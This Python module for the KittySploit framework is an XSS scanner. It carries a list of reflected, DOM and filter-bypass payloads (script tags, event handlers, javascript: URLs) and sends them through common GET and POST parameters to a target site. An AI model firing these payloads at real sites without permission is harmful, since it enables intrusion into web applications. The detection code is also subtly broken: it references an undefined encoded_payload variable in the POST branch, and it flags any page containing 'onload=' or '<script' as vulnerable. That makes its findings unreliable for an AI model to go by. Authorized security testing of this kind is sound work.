#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re
import urllib.parse
import html


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'XSS Scanner',
        'description': 'Scans for Cross-Site Scripting (XSS) vulnerabilities including reflected, stored, and DOM-based XSS',
        'author': 'KittySploit Team',
        'tags': ['web', 'xss', 'scanner', 'security', 'injection'],
        'references': [
            'https://owasp.org/www-community/attacks/xss/',
            'https://portswigger.net/web-security/cross-site-scripting',
            'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
        ]
    }

    # XSS payloads
    XSS_PAYLOADS = [
        # Basic XSS
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(\'XSS\')</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        
        # Event handlers
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
        '<svg/onload=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        
        # JavaScript protocol
        'javascript:alert(1)',
        'javascript:alert("XSS")',
        'javascript:alert(\'XSS\')',
        'javascript:alert(String.fromCharCode(88,83,83))',
        
        # Encoded payloads
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        
        # Bypass filters
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror=alert(1)//',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=\'alert(1)\'>',
        '<img src=x onerror=alert&lpar;1&rpar;>',
        '<img src=x onerror=alert&#40;1&#41;>',
        
        # Polyglot payloads
        '"><img src=x onerror=alert(1)>',
        '\'><img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '\'><script>alert(1)</script>',
        
        # DOM-based XSS
        '#<img src=x onerror=alert(1)>',
        '?test=<img src=x onerror=alert(1)>',
        '?test=javascript:alert(1)',
        
        # HTML5 entities
        '<svg/onload=alert(1)>',
        '<svg><animatetransform onbegin=alert(1)>',
        
        # CSS injection (if reflected in style)
        '<style>@import\'javascript:alert("XSS")\';</style>',
        '<link rel=stylesheet href=javascript:alert(1)>',
    ]

    # Parameter names commonly used
    COMMON_PARAMS = [
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'name', 'value', 'id', 'key', 'data', 'input',
        'message', 'comment', 'title', 'description',
        'user', 'username', 'email', 'content', 'text',
        'url', 'uri', 'link', 'redirect', 'return',
    ]

    def check(self):
        """
        Check if the target is accessible
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response and response.status_code in [200, 301, 302, 403, 404, 401]:
                return True
            return False
        except Exception as e:
            return False

    def test_xss_payload(self, payload, param_name='q', method='GET'):
        """
        Test an XSS payload
        
        Args:
            payload: The XSS payload to test
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
            else:
                # POST request
                post_data = {param_name: payload}
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data,
                    allow_redirects=False
                )
            
            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}
            
            # Analyze response for XSS indicators
            is_vulnerable = False
            indicators = []
            xss_type = None
            
            # Check if payload is reflected
            is_reflected = payload in response.text or encoded_payload in response.text
            
            # Check for HTML-encoded payload
            html_encoded = html.escape(payload)
            is_html_encoded = html_encoded in response.text
            
            # Check for JavaScript execution indicators
            js_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'alert(']
            has_js_indicators = any(indicator in response.text.lower() for indicator in js_indicators)
            
            # Check for event handlers
            event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
            has_event_handlers = any(handler in response.text.lower() for handler in event_handlers)
            
            # Determine XSS type
            if is_reflected and not is_html_encoded:
                is_vulnerable = True
                if has_js_indicators or has_event_handlers:
                    xss_type = 'Reflected XSS'
                else:
                    xss_type = 'Potential Reflected XSS'
                indicators.append('Payload reflected in response')
            
            if has_js_indicators:
                is_vulnerable = True
                if not xss_type:
                    xss_type = 'Reflected XSS (JavaScript detected)'
                indicators.append('JavaScript code detected in response')
            
            if has_event_handlers:
                is_vulnerable = True
                if not xss_type:
                    xss_type = 'Reflected XSS (Event handler detected)'
                indicators.append('Event handler detected in response')
            
            # Check for DOM-based XSS indicators
            if '#' in payload or '?' in payload:
                if payload.split('#')[0] in response.text or payload.split('?')[0] in response.text:
                    indicators.append('Possible DOM-based XSS')
                    if not xss_type:
                        xss_type = 'Potential DOM-based XSS'
            
            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'xss_type': xss_type,
                'is_reflected': is_reflected,
                'is_html_encoded': is_html_encoded,
                'has_js_indicators': has_js_indicators,
                'has_event_handlers': has_event_handlers,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_length': len(response.text)
            }
            
        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the XSS scan
        """
        self.vulnerabilities = []
        self.test_results = []
        
        print_status("Starting XSS scan...")
        print_info(f"Target: {self.target}")
        print_info("")
        
        # Test GET parameters
        print_status("Testing GET parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.COMMON_PARAMS:
            print_info(f"Testing parameter: {param}")
            
            for i, payload in enumerate(self.XSS_PAYLOADS[:15], 1):  # Test first 15 payloads per param
                result = self.test_xss_payload(payload, param, method='GET')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('xss_type', 'Unknown')}")
                    print_info(f"      Reflected: {result.get('is_reflected', False)}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info(f"      Status Code: {result.get('status_code')}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Test POST parameters
        print_status("Testing POST parameters for XSS vulnerabilities...")
        print_info("")
        
        for param in self.COMMON_PARAMS[:10]:  # Test first 10 params via POST
            print_info(f"Testing POST parameter: {param}")
            
            for payload in self.XSS_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_xss_payload(payload, param, method='POST')
                self.test_results.append(result)
                
                if result.get('vulnerable'):
                    print_success(f"  [!] Potential XSS found (POST)!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Type: {result.get('xss_type', 'Unknown')}")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)
        
        print_info("")
        
        # Summary
        print_status("=" * 60)
        print_status("XSS Scan Summary")
        print_status("=" * 60)
        
        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")
        
        if self.vulnerabilities:
            print_warning("XSS vulnerabilities detected:")
            print_info("")
            
            # Group by XSS type
            by_type = {}
            for vuln in self.vulnerabilities:
                xss_type = vuln.get('xss_type', 'Unknown')
                if xss_type not in by_type:
                    by_type[xss_type] = []
                by_type[xss_type].append(vuln)
            
            for xss_type, vulns in by_type.items():
                print_info(f"{xss_type} ({len(vulns)} found):")
                table_data = []
                for vuln in vulns[:10]:  # Show first 10 per type
                    payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                    indicators = ', '.join(vuln.get('indicators', [])[:1])
                    table_data.append([
                        vuln.get('param', 'N/A'),
                        vuln.get('method', 'GET'),
                        payload_short,
                        indicators
                    ])
                
                if table_data:
                    print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
                print_info("")
            
            print_warning("IMPORTANT: These are potential XSS vulnerabilities. Manual verification in a browser is required.")
        else:
            print_info("No XSS vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")
        
        return True
